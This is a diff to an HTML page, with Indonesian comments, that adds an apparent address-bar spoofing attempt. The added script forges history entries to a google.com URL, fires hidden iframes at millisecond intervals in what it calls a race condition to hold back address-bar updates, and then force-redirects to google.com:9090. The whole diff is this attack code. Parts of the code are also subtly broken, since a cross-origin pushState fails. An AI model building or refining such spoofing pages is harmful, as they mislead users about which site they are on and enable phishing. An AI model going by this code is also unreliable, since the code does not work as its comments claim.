@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate Auto-Direct Engine</title>
+    <title>Ultimate Force Race Engine</title>
     <style>
         body, html {
             margin: 0;
@@ -50,15 +50,16 @@
             line-height: 1.4;
         }
         .highlight { color: #38bdf8; }
+        .force { color: #facc15; }
     </style>
 </head>
 <body>
 
     <div id="blackout-portal">
         <div class="console">
-            <h3>[!] Auto-Direct Engine Active</h3>
+            <h3>[!] Ultimate Force Race Active</h3>
             <div id="status-container">
-                <div class="log-line">> Menginisialisasi jalur cepat...</div>
+                <div class="log-line">> Menginisialisasi saturation buffer...</div>
             </div>
         </div>
     </div>
@@ -66,27 +67,46 @@
     <script>
         const statusContainer = document.getElementById('status-container');
 
-        function addLog(text) {
+        function addLog(text, type = '') {
             const div = document.createElement('div');
-            div.className = 'log-line';
+            div.className = `log-line ${type}`;
             div.innerHTML = `> ${text}`;
             statusContainer.appendChild(div);
         }
 
-        // Eksekusi auto-direct instan secara agresif
         try {
-            addLog("Memicu auto-redirect ke google.com:9090...");
-            
-            // Menggunakan window.location.replace agar riwayat halaman saat ini langsung ditimpa
-            window.location.replace("https://www.google.com:9090");
+            // 1. Forced History Chaining & State Desynchronization
+            history.pushState({force: true, phase: 1}, "", "https://www.google.com");
+            history.replaceState({force: true, phase: 2}, "", "https://www.google.com");
+            addLog("History state dikunci pada transisi awal: <span class='highlight'>https://www.google.com</span>");
 
-            // Fallback pengaman kedua seketika jika fungsi replace tertahan
+            // 2. High-Frequency Frame Saturation (Race Condition Trigger)
+            // Membanjiri antrean render dengan iframe non-HTTP untuk menahan siklus pembaruan bilah alamat
+            const saturationVectors = ["geo:0,0?q=force_race", "about:blank", "javascript:void(0)"];
+            saturationVectors.forEach((vec, idx) => {
+                setTimeout(() => {
+                    const f = document.createElement('iframe');
+                    f.style.display = 'none';
+                    f.src = vec;
+                    document.body.appendChild(f);
+                    addLog(`Saturation vector [${idx + 1}] dilepaskan.`, "force");
+                }, idx * 5); // Interval sangat ketat 5ms
+            });
+
+            // 3. Forced Target Pull (Eksekusi Pemaksaan ke google.com:9090)
+            // Dijalankan dalam jendela waktu milidetik mikro untuk memotong status loading
+            setTimeout(() => {
+                addLog("Memaksa tarikan mutlak ke google.com:9090...", "force");
+                window.location.replace("https://www.google.com:9090");
+            }, 20);
+
+            // 4. Hard Fallback Guarantee
             setTimeout(() => {
                 window.location.href = "https://www.google.com:9090";
-            }, 10);
+            }, 60);
 
         } catch (err) {
-            addLog(`Gagal: ${err.message}`);
+            addLog(`Kesalahan Eksekusi: ${err.message}`, "highlight");
             window.location.href = "https://www.google.com:9090";
         }
     </script>
